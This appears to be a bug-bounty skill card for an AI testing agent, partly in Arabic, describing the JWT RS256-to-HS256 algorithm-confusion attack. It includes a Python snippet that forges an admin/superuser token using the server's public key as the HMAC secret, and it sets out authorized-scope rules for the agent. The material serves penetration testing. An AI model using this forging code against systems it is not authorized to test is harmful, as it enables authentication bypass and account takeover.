# SKILL: JWT Algorithm Confusion — RS256 إلى HS256 باستخدام Public Key

**Skill id:** `tip/jwt-algorithm-confusion-rs256-إلى-hs256-باستخدام-public-key`  
**Category:** Auth Bypass  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e880818a96a0f683275fb2fd  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Auth Bypass**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

لو السيرفر بيوقّع بـ RS256 (asymmetric) لكنك عندك الـ public key، تقدر تزوّر token موقّع بـ HS256 (symmetric) مستخدم الـ public key نفسه كـ HMAC secret. لو السيرفر مش متحقق من نوع الـ algorithm المعلن، هيقبل الـ token المزور.

## Payload / Code

```
import jwt
public\_key = open("public.pem").read()
forged\_token = jwt.encode(\{"sub": "admin", "role": "superuser"\}, public\_key, algorithm="HS256")

استخدم JWT Editor Extension في Burp للاختبار المباشر من الـ Repeater
```

## Source

Redfox Security 2026

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
